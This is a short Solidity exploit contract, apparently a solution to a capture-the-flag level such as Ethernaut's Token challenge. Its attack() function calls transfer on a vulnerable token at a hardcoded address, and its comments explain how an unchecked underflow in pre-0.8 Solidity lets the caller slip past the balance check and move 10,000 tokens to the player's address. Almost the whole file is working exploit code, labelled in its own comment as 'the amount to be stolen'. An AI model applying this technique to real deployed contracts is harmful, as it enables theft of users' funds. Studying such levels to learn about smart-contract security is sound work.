//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract GXT{
    uint value=10000;
    //this is the amount to be stolen 
    Token token;
    address instance= 0xD273D6264E3Eec6Fe5d2EC72887E5fE8d0645a79;

    constructor() public {
        token = Token(instance);
    }

    function attack() public {
        token.transfer(0x25584D7A2a5A8915369897A7Cc2B60B11d72f657, value);
        //by calling the transfer  fct the following happens: 
        //1. the require statement will pass because it substracts 10k from 20
        // and thanks to the old solidity version used an underflow happens 
        // => the result will be 2^256-1 - (10000-21) - a big positive number
        //2. the balance of msg.sender (this contract will be underflowed in the same manner)
        //3. the balance of _to (my player address) will be increased by the amount (10000 tokens)
    }
}
